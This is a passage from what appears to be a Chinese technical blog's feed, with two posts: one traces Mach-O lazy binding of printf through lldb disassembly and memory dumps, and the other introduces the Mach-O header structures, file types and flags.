class="built_in">printf</span></span><br><span class="line">    <span class="number">0x100000f37</span> &lt;+<span class="number">39</span>&gt;: leaq   <span class="number">0x47</span>(%rip), %rdi          ; <span class="string">"2Hello, World!\n"</span></span><br><span class="line">    <span class="number">0x100000f3e</span> &lt;+<span class="number">46</span>&gt;: movl   %eax, -<span class="number">0x14</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f41</span> &lt;+<span class="number">49</span>&gt;: movb   $<span class="number">0x0</span>, %al</span><br><span class="line">    <span class="number">0x100000f43</span> &lt;+<span class="number">51</span>&gt;: callq  <span class="number">0x100000f56</span>               ; symbol stub <span class="keyword">for</span>: <span class="built_in">printf</span></span><br><span class="line">    <span class="number">0x100000f48</span> &lt;+<span class="number">56</span>&gt;: xorl   %ecx, %ecx</span><br><span class="line">    <span class="number">0x100000f4a</span> &lt;+<span class="number">58</span>&gt;: movl   %eax, -<span class="number">0x18</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f4d</span> &lt;+<span class="number">61</span>&gt;: movl   %ecx, %eax</span><br><span class="line">    <span class="number">0x100000f4f</span> &lt;+<span class="number">63</span>&gt;: addq   $<span class="number">0x20</span>, %rsp</span><br><span class="line">    <span class="number">0x100000f53</span> &lt;+<span class="number">67</span>&gt;: popq   %rbp</span><br><span class="line">    <span class="number">0x100000f54</span> &lt;+<span class="number">68</span>&gt;: retq</span><br></pre></td></tr></table></figure>
<p>在<code>0x100000f52 &lt;+34&gt;</code>行处通过<code>callq 0x100000f64</code>来调用printf。</p>
<p>执行<code>callq</code>指令之后代码跳转到这里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazy_bind`<span class="built_in">printf</span>:</span><br><span class="line">-&gt;  <span class="number">0x100000f56</span> &lt;+<span class="number">0</span>&gt;: jmpq   *<span class="number">0xb4</span>(%rip)               ; (<span class="keyword">void</span> *)<span class="number">0x0000000100000f6c</span></span><br></pre></td></tr></table></figure>
<h2 id="1-2___Data,__la_symbol_ptr_获取函数地址">1.2 __Data,__la_symbol_ptr 获取函数地址</h2><p>这里的jmpq要跳转到<code>0x0000000100000f6c</code>这个地址是从__Data,__la_symbol_ptr中的Lazy Symbol Pointers中获取到的。(怎么来的不是很清楚？)希望通过stub来调用printf函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/lazysymbolpointers.png?1" alt=""></p>
<p>通过命令行查看<code>0x100001010</code>处的地址获得了同样的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x <span class="number">0x100001010</span></span><br><span class="line"><span class="number">0x100001010</span>: <span class="number">6</span>c <span class="number">0f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  l...............</span><br><span class="line"><span class="number">0x100001020</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br></pre></td></tr></table></figure>
<h2 id="1-3_通过__stub__helper进行lazybind">1.3 通过__stub__helper进行lazybind</h2><p>在Mach-O中每一个Symbol Stub可能有以下两种行为其中之一：</p>
<ul>
<li>跳转到函数的指令，执行函数体</li>
<li>通过动态链接器查找函数的Symbol(符号)，然后执行函数。</li>
</ul>
<p>通过工具查看__stubs的Section数据，发现只有一个函数就是_printf。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/_stub.png" alt="__TEXT,__stubs"></p>
<p>这里的Data其实就是上面看到的<code>jmpq</code>代码。执行之后代码跳转到了这样的代码片段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0x100000f6c</span>: pushq  $<span class="number">0x0</span></span><br><span class="line">    <span class="number">0x100000f71</span>: jmp    <span class="number">0x100000f5c</span></span><br><span class="line">    <span class="number">0x100000f76</span>: gs     				;这里往下都没有！！！！</span><br><span class="line">    <span class="number">0x100000f78</span>: insb   %dx, %es:(%rdi)</span><br><span class="line">    <span class="number">0x100000f79</span>: insb   %dx, %es:(%rdi)</span><br><span class="line">    <span class="number">0x100000f7a</span>: outsl  (%rsi), %dx</span><br><span class="line">    <span class="number">0x100000f7b</span>: subb   $<span class="number">0x20</span>, %al</span><br><span class="line">    <span class="number">0x100000f7d</span>: pushq  %rdi</span><br><span class="line">    <span class="number">0x100000f7e</span>: outsl  (%rsi), %dx</span><br><span class="line">    <span class="number">0x100000f7f</span>: jb     <span class="number">0x100000fed</span></span><br><span class="line">    <span class="number">0x100000f81</span>: andl   %ecx, %fs:(%rdx)</span><br><span class="line">    <span class="number">0x100000f84</span>: addb   %dh, (%rdx)</span><br><span class="line">    <span class="number">0x100000f86</span>: gs     </span><br><span class="line">    <span class="number">0x100000f88</span>: insb   %dx, %es:(%rdi)</span><br><span class="line">    <span class="number">0x100000f89</span>: insb   %dx, %es:(%rdi)</span><br><span class="line">    <span class="number">0x100000f8a</span>: outsl  (%rsi), %dx</span><br></pre></td></tr></table></figure>
<p>这里就是通过_stub_helper来调用dyld_stub<em>binder函数来计算printf函数的真实地址。通过下面的\</em>_TEXT,__stub_helper具体信息可以看出，jmpq 0x100000f5c,就是在压入参数0x0(函数的link的时候给的编号)之后跳转到Section的起始处，调用了binder。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/_stub_helper.png?1" alt="_stub_helper.png"></p>
<p>binder是一块汇编代码。这里就不做解释了。作用就是计算具体的函数地址，并调用printf。</p>
<h2 id="1-4_第二次调用printf函数">1.4 第二次调用printf函数</h2><p>这个释放断点，程序将在调用第二个printf函数的地方停下来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lazy_bind`main:</span><br><span class="line">    <span class="number">0x100000f10</span> &lt;+<span class="number">0</span>&gt;:  pushq  %rbp</span><br><span class="line">    <span class="number">0x100000f11</span> &lt;+<span class="number">1</span>&gt;:  movq   %rsp, %rbp</span><br><span class="line">    <span class="number">0x100000f14</span> &lt;+<span class="number">4</span>&gt;:  subq   $<span class="number">0x20</span>, %rsp</span><br><span class="line">    <span class="number">0x100000f18</span> &lt;+<span class="number">8</span>&gt;:  leaq   <span class="number">0x57</span>(%rip), %rax          ; <span class="string">"Hello, World!\n"</span></span><br><span class="line">    <span class="number">0x100000f1f</span> &lt;+<span class="number">15</span>&gt;: movl   $<span class="number">0x0</span>, -<span class="number">0x4</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f26</span> &lt;+<span class="number">22</span>&gt;: movl   %edi, -<span class="number">0x8</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f29</span> &lt;+<span class="number">25</span>&gt;: movq   %rsi, -<span class="number">0x10</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f2d</span> &lt;+<span class="number">29</span>&gt;: movq   %rax, %rdi</span><br><span class="line">    <span class="number">0x100000f30</span> &lt;+<span class="number">32</span>&gt;: movb   $<span class="number">0x0</span>, %al</span><br><span class="line">    <span class="number">0x100000f32</span> &lt;+<span class="number">34</span>&gt;: callq  <span class="number">0x100000f56</span>               ; symbol stub <span class="keyword">for</span>: <span class="built_in">printf</span></span><br><span class="line">    <span class="number">0x100000f37</span> &lt;+<span class="number">39</span>&gt;: leaq   <span class="number">0x47</span>(%rip), %rdi          ; <span class="string">"2Hello, World!\n"</span></span><br><span class="line">    <span class="number">0x100000f3e</span> &lt;+<span class="number">46</span>&gt;: movl   %eax, -<span class="number">0x14</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f41</span> &lt;+<span class="number">49</span>&gt;: movb   $<span class="number">0x0</span>, %al</span><br><span class="line">-&gt;  <span class="number">0x100000f43</span> &lt;+<span class="number">51</span>&gt;: callq  <span class="number">0x100000f56</span>               ; symbol stub <span class="keyword">for</span>: <span class="built_in">printf</span></span><br><span class="line">    <span class="number">0x100000f48</span> &lt;+<span class="number">56</span>&gt;: xorl   %ecx, %ecx</span><br><span class="line">    <span class="number">0x100000f4a</span> &lt;+<span class="number">58</span>&gt;: movl   %eax, -<span class="number">0x18</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f4d</span> &lt;+<span class="number">61</span>&gt;: movl   %ecx, %eax</span><br><span class="line">    <span class="number">0x100000f4f</span> &lt;+<span class="number">63</span>&gt;: addq   $<span class="number">0x20</span>, %rsp</span><br><span class="line">    <span class="number">0x100000f53</span> &lt;+<span class="number">67</span>&gt;: popq   %rbp</span><br><span class="line">    <span class="number">0x100000f54</span> &lt;+<span class="number">68</span>&gt;: retq</span><br></pre></td></tr></table></figure>
<p>执行指令之后发现和第一次调用printf已经不一样了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazy_bind`<span class="built_in">printf</span>:</span><br><span class="line">-&gt;  <span class="number">0x100000f56</span> &lt;+<span class="number">0</span>&gt;: jmpq   *<span class="number">0xb4</span>(%rip)               ; (<span class="keyword">void</span> *)<span class="number">0x00007fff96b1815c</span>: <span class="built_in">printf</span></span><br></pre></td></tr></table></figure>
<p>通过指令再一次查看<code>0x100001010</code>处的内存值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x <span class="number">0x100001010</span></span><br><span class="line"><span class="number">0x100001010</span>: <span class="number">5</span>c <span class="number">81</span> b1 <span class="number">96</span> ff <span class="number">7f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  \...............</span><br><span class="line"><span class="number">0x100001020</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br></pre></td></tr></table></figure>
<p>也就是说 __Data,__la_symbol_ptr中指向printf地址的值已经发生了变化，指向了printf的指令。</p>
<h2 id="1-5_小结">1.5 小结</h2><p>证明了，延迟绑定只会在第一次调用的时候发生。整个流程与linux中的PLT与GOT在实现逻辑上基本是相同的，只是具体的代码实现不一样。</p>
<h1 id="0x02_相关LoadCommand">0x02 相关LoadCommand</h1><p>上面只是通过调试简单的了解了动态链接的表现，要理解动态链接还需对几个数据结构有所了解。</p>
<h2 id="2-1_LC_SYMTAB">2.1 LC_SYMTAB</h2><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/LC_SYMTAB.png?1" alt="LC_SYMTAB"></p>
<p>LC_SYMTAB这个LoadCommand主要提供了两个信息</p>
<ul>
<li>Symbol Table的偏移量与Symbol Table中元素的个数</li>
<li>String Table的偏移量与String Table的长度</li>
</ul>
<h3 id="2-1-1_Symbol_Table">2.1.1 Symbol Table</h3><blockquote>
<p>在计算机科学中，符号表是一种用于语言翻译器（例如编译器和解释器）中的数据结构。在符号表中，程序源代码中的每个标识符都和它的声明或使用信息绑定在一起，比如其数据类型、作用域以及内存地址。</p>
<p>–wiki</p>
</blockquote>
<p>简单的理解就是Symbol Table里面包含了所有会被调用的函数的信息，无论是已经bind的还是没有bind的函数。</p>
<h3 id="2-2-2_String_Table">2.2.2 String Table</h3><p>这个很好理解，在符号处理时所有会用到的字符串放在了这里。和__TEXT,__cstring不同。</p>
<h2 id="2-2_LC_DYSYMTAB">2.2 LC_DYSYMTAB</h2><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/LC_DYSYMTAB.png" alt="LC_DYSYMTAB"></p>
<p>LC_DYSYMTAB的数据结构，如图所示。这一个LoadCommand与动态链接相关的就是红框标出的两个字段，标示了需要动态符号表的偏移量与符号个数。</p>
<p>动态符号表的数据结构非常的简单，是一个32bit的索引的数组。通过索引可以在Symbol Table中寻找到对应的函数信息。</p>
<h1 id="0x03_小结">0x03 小结</h1><p>通过分析两次printf的调用流程，加深对Mach-O结构以及动态链接的流程理解，为进一步理解dyld的工作原理，源码阅读提供了知识的储备。</p>
<p>通过和Linux的PTL与GOT比较可以更容易理解逻辑。</p>
<p>整个流程是如何通过代码实现的还需要进一步的分析与研究。</p>
<h1 id="0x04_参考">0x04 参考</h1><p>1.Dynamic Linking: ELF vs. Mach-O</p>
<p><a href="http://timetobleed.com/dynamic-linking-elf-vs-mach-o/" target="_blank" rel="external">http://timetobleed.com/dynamic-linking-elf-vs-mach-o/</a></p>
<p>2.Dynamic symbol table duel: ELF vs Mach-O, round 2</p>
<p><a href="http://timetobleed.com/dynamic-symbol-table-duel-elf-vs-mach-o-round-2/" target="_blank" rel="external">http://timetobleed.com/dynamic-symbol-table-duel-elf-vs-mach-o-round-2/</a></p>
<h1 id="PS:">PS:</h1><p>更多文章可以在我的学习分享博客<a href="http://BLOGIMAGE/" target="_blank" rel="external">http://BLOGIMAGE/</a></p>
<p>希望可以多多交流，不足之处还希望大家可以给与指正：）</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>通过分析<code>Mach-O</code>的动态链接过程，加深对<code>Mach-O</code>文件结构的理解。对Mach-O文件格式的简单的分析看这里<a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">这里</a>。</p>]]>
    
    </summary>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="dynamic link" scheme="http://turingh.github.io/tags/dynamic-link/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mach-o格式分析]]></title>
    <link href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/07/mach-o文件格式分析/</id>
    <published>2016-03-07T16:18:09.000Z</published>
    <updated>2016-03-24T03:37:29.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>人生无根蒂，飘如陌上尘。 分散逐风转，此已非常身。</p>
<p>— 陶渊明 《杂诗》</p>
</blockquote>
<p><code>mach-o</code>格式是OS X系统上的可执行文件格式，类似于windows的<code>PE</code>与linux的<code>ELF</code>，如果不彻底搞清楚<code>mach-o</code>的格式与相关知识，去做其他研究，无异于建造空中阁楼。</p>
<p>每个Mach-O文件斗包含一个Mach-O头，然后是载入命令(Load Commands),最后是数据块(Data)。</p>
<p>接下来就对整个Mach-O的格式做出详细的分析。</p>
<a id="more"></a>
<h1 id="0x01_Mach-O格式简单介绍">0x01 Mach-O格式简单介绍</h1><p>Mach-O文件的格式如下图所示：</p>
<p><img src="http://www.codeproject.com/KB/recipes/dynamic_linking-in-mach-o/im1.jpg" alt="Mach-O"></p>
<p>又如下几个部分组成：</p>
<ul>
<li>Header：保存了Mach-O的一些基本信息，包括了平台、文件类型、LoadCommands的个数等等。</li>
<li>LoadCommands：这一段紧跟Header，加载Mach-O文件时会使用这里的数据来确定内存的分布。</li>
<li>Data：每一个segment的具体数据都保存在这里，这里包含了具体的代码、数据等等。</li>
</ul>
<h1 id="0x02_Headers">0x02 Headers</h1><h2 id="2-1_数据结构">2.1 数据结构</h2><p>Headers的定义可以在开源的内核代码中找到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * The 32-bit mach header appears at the very beginning of the object file for</span><br><span class="line"> * 32-bit architectures.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> mach_header &#123;</span><br><span class="line">	<span class="keyword">uint32_t</span>	magic;		<span class="comment">/* mach magic number identifier */</span></span><br><span class="line">	<span class="keyword">cpu_type_t</span>	cputype;	<span class="comment">/* cpu specifier */</span></span><br><span class="line">	<span class="keyword">cpu_subtype_t</span>	cpusubtype;	<span class="comment">/* machine specifier */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	filetype;	<span class="comment">/* type of file */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	ncmds;		<span class="comment">/* number of load commands */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	sizeofcmds;	<span class="comment">/* the size of all the load commands */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Constant for the magic field of the mach_header (32-bit architectures) */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_MAGIC	<span class="number">0xfeedface</span>	<span class="comment">/* the mach magic number */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_CIGAM	<span class="number">0xcefaedfe</span>	<span class="comment">/* NXSwapInt(MH_MAGIC) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * The 64-bit mach header appears at the very beginning of object files for</span><br><span class="line"> * 64-bit architectures.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> mach_header_64 &#123;</span><br><span class="line">	<span class="keyword">uint32_t</span>	magic;		<span class="comment">/* mach magic number identifier */</span></span><br><span class="line">	<span class="keyword">cpu_type_t</span>	cputype;	<span class="comment">/* cpu specifier */</span></span><br><span class="line">	<span class="keyword">cpu_subtype_t</span>	cpusubtype;	<span class="comment">/* machine specifier */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	filetype;	<span class="comment">/* type of file */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	ncmds;		<span class="comment">/* number of load commands */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	sizeofcmds;	<span class="comment">/* the size of all the load commands */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved;	<span class="comment">/* reserved */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Constant for the magic field of the mach_header_64 (64-bit architectures) */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_MAGIC_64 <span class="number">0xfeedfacf</span> <span class="comment">/* the 64-bit mach magic number */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_CIGAM_64 <span class="number">0xcffaedfe</span> <span class="comment">/* NXSwapInt(MH_MAGIC_64) */</span></span></span><br></pre></td></tr></table></figure>
<p>根据<code>mach_header</code>与<code>mach_header_64</code>的定义，很明显可以看出，Headers的主要作用就是帮助系统迅速的定位Mach-O文件的运行环境，文件类型。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-fmt/Header.png" alt="Header"></p>
<h2 id="2-2_实例">2.2 实例</h2><p>使用工具分析一个mach-o文件来具体的看一下Mach-O Headers。</p>
<p>通过otool可以得到Mach header的具体的情况，但是可读性略微有一点差。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  bin otool -h git</span><br><span class="line">git:</span><br><span class="line">Mach header</span><br><span class="line">      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags</span><br><span class="line"> <span class="number">0xfeedfacf</span> <span class="number">16777223</span>          <span class="number">3</span>  <span class="number">0x80</span>           <span class="number">2</span>    <span class="number">17</span>       <span class="number">1432</span> <span class="number">0x00200085</span></span><br></pre></td></tr></table></figure>
<p>还有一个工具是MachOview可以看的更清楚一点。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-fmt/macho_header.png" alt="Header"></p>
<ul>
<li>MagicNumber的值为0xFEEDFACF所以该文件是一个64位平台上的文件</li>
<li>CPU Type和CPU SubType也很容易理解，运行在X86_64的CPU平台上</li>
<li>File Type标示了该文件是一个可执行文件，后面具体分析</li>
<li>Flags标示了这个MachO文件的四个特性，后面具体分析</li>
</ul>
<h2 id="2-3_具体参数">2.3 具体参数</h2><h3 id="2-3-1_FileType">2.3.1 FileType</h3><p>因为Mach-O文件不仅仅用来实现可执行文件，同时还用来实现了其他内容</p>
<ul>
<li>内核扩展</li>
<li>库文件</li>
<li>CoreDump</li>
<li>…</li>
</ul>
<p>他的源码定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_OBJECT	<span class="number">0x1</span>		<span class="comment">/* relocatable object file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_EXECUTE	<span class="number">0x2</span>		<span class="comment">/* demand paged executable file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_FVMLIB	<span class="number">0x3</span>		<span class="comment">/* fixed VM shared library file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_CORE		<span class="number">0x4</span>		<span class="comment">/* core file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_PRELOAD	<span class="number">0x5</span>		<span class="comment">/* preloaded executable file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_DYLIB	<span class="number">0x6</span>		<span class="comment">/* dynamically bound shared library */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_DYLINKER	<span class="number">0x7</span>		<span class="comment">/* dynamic link editor */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_BUNDLE	<span class="number">0x8</span>		<span class="comment">/* dynamically bound bundle file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_DYLIB_STUB	<span class="number">0x9</span>		<span class="comment">/* shared library stub for static */</span></span></span><br><span class="line">					<span class="comment">/*  linking only, no section contents */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_DSYM		<span class="number">0xa</span>		<span class="comment">/* companion file with only debug */</span></span></span><br><span class="line">					<span class="comment">/*  sections */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_KEXT_BUNDLE	<span class="number">0xb</span>		<span class="comment">/* x86_64 kexts */</span></span></span><br></pre></td></tr></table></figure>
<p>解释一下一些常用到的文件类型。</p>
<table>
<thead>
<tr>
<th>File Type</th>
<th>用处</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr>
<td>MH_OBJECT</td>
<td>编译过程中产生的*.obj文件</td>
<td>gcc -c xxx.c 生成xxx.o文件</td>
</tr>
<tr>
<td>MH_EXECUTABLE</td>
<td>可执行二进制文件</td>
<td>/usr/bin/git</td>
</tr>
<tr>
<td>MH_CORE</td>
<td>CoreDump</td>
<td>崩溃时的Dump文件</td>
</tr>
<tr>
<td>MH_DYLIB</td>
<td>动态库</td>
<td>/usr/lib/里面的那些库文件</td>
</tr>
<tr>
<td>MH_DYLINKER</td>
<td>连接器linker</td>
<td>/usr/lib/dyld文件</td>
</tr>
<tr>
<td>MH_KEXT_BUNDLE</td>
<td>内核扩展文件</td>
<td>自己开发的简单内核模块</td>
</tr>
</tbody>
</table>
<h3 id="2-3-2_flags">2.3.2 flags</h3><p>Mach-O headers还包含了一些很重要的dyld的加载参数。代码中的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_INCRLINK	<span class="number">0x2</span>		<span class="comment">/* the object file is the output of an</span><br><span class="line">					   incremental link against a base file</span><br><span class="line">					   and can't be link edited again */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_DYLDLINK	<span class="number">0x4</span>		<span class="comment">/* the object file is input for the</span><br><span class="line">					   dynamic linker and can't be staticly</span><br><span class="line">					   link edited again */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_BINDATLOAD	<span class="number">0x8</span>		<span class="comment">/* the object file's undefined</span><br><span class="line">					   references are bound by the dynamic</span><br><span class="line">					   linker when loaded. */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_PREBOUND	<span class="number">0x10</span>		<span class="comment">/* the file has its dynamic undefined</span><br><span class="line">					   references prebound. */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_SPLIT_SEGS	<span class="number">0x20</span>		<span class="comment">/* the file has its read-only and</span><br><span class="line">					   read-write segments split */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_LAZY_INIT	<span class="number">0x40</span>		<span class="comment">/* the shared library init routine is</span><br><span class="line">					   to be run lazily via catching memory</span><br><span class="line">					   faults to its writeable segments</span><br><span class="line">					   (obsolete) */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_TWOLEVEL	<span class="number">0x80</span>		<span class="comment">/* the image is using two-level name</span><br><span class="line">					   space bindings */</span></span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//太长，有兴趣可以自己看源码</span></span><br><span class="line"><span class="comment">// EXTERNAL_HEADERS/mach-o/x86_64/loader.h</span></span><br></pre></td></tr></table></figure>
<p>同样简单的介绍几个比较重要的。</p>
<table>
<thead>
<tr>
<th>Flag Type</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>MH_NOUNDEFS</td>
<td>目标没有未定义的符号，不存在链接依赖</td>
</tr>
<tr>
<td>MH_DYLDLINK</td>
<td>该目标文件是dyld的输入文件，无法被再次的静态链接</td>
</tr>
<tr>
<td>MH_PIE</td>
<td>允许随机的地址空间</td>
</tr>
<tr>
<td>MH_ALLOW_STACK_EXECUTION</td>
<td>栈内存可执行代码，一般是默认关闭的。</td>
</tr>
<tr>
<td>MH_NO_HEAP_EXECUTION</td>
<td>堆内存无法执行代码</td>
</tr>
</tbody>
</table>
<h2 id="2-4_Headers小结">2.4 Headers小结</h2><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-fmt/Header_butter_fly.png" alt="Headers"></p>
<h1 id="0x03_Load_Commands">0x03 Load Commands</h1><p>这是load_command的数据结构</p>
